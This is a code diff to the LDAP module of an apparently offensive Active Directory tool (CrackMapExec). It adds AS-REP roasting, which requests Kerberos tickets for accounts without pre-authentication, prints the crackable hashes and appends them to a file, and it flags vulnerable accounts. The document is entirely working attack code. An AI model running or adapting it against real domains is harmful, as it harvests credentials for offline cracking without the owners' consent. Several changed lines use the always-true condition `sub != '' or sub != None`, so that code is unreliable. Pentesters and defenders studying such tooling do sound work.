@@ -16,7 +16,7 @@ from Cryptodome.Hash import MD4
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb import SMB_DIALECT
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
-from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS, SessionKeyDecryptionError
 from impacket.krb5.types import KerberosTime, Principal
 from impacket.ldap import ldap as ldap_impacket
 from impacket.krb5 import constants
@@ -260,6 +260,14 @@ class ldap(connection):
         if lmhash: self.lmhash = lmhash
         if nthash: self.nthash = nthash
 
+        if self.password == '' and self.args.asreproast:
+            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
+            if hash_TGT:
+                self.logger.highlight(u'{}'.format(hash_TGT))
+                with open(self.args.asreproast, 'a+') as hash_asreproast:
+                    hash_asreproast.write(hash_TGT + '\n')
+            return False
+
         try:
             # Connect to LDAP
             proto = "ldaps" if self.args.gmsa else "ldap"
@@ -276,7 +284,7 @@ class ldap(connection):
                                     self.username,
                                     # Show what was used between cleartext, nthash, aesKey and ccache
                                     " from ccache" if useCache
-                                    else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                    else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                     highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
 
             self.logger.extra['protocol'] = "LDAP"
@@ -287,12 +295,20 @@ class ldap(connection):
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if not self.args.continue_on_success:
                 return True
+        except SessionKeyDecryptionError:
+            # for PRE-AUTH account
+            self.logger.error(u'{}\\{}{} {}'.format(domain,
+                                                    self.username,
+                                                    " account vulnerable to asreproast attack",
+                                                    ""),
+                                                    color='yellow')
+            return False
         except SessionError as e:
             error, desc = e.getErrorString()
             self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                 self.username,
                                                 " from ccache" if useCache
-                                                else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                                else ":%s" % (next((sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None)) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                 str(error)),
                                                 color='magenta' if error in ldap_error_status else 'red')
             return False
@@ -300,7 +316,7 @@ class ldap(connection):
             self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                 self.username,
                                                 " from ccache" if useCache
-                                                else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                                else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                 ''),
                                                 color='red')
             return False
@@ -322,7 +338,7 @@ class ldap(connection):
                     out = u'{}\\{}{} {}'.format(domain,
                                             self.username,
                                             " from ccache" if useCache
-                                            else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                            else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                             highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                     
                     if self.username == '':
@@ -356,7 +372,7 @@ class ldap(connection):
                     self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                         self.username,
                                                         " from ccache" if useCache
-                                                        else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                                        else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                         str(error)),
                                                         color='magenta' if error in ldap_error_status else 'red')
                     return False
@@ -365,7 +381,7 @@ class ldap(connection):
                 self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                  self.username,
                                                  " from ccache" if useCache
-                                                 else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '') if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
+                                                 else ":%s" % (next(sub for sub in [self.nthash, password, aesKey] if sub != '' or sub != None) if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                  ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                  color='magenta' if errorCode in ldap_error_status else 'red')
                 return False
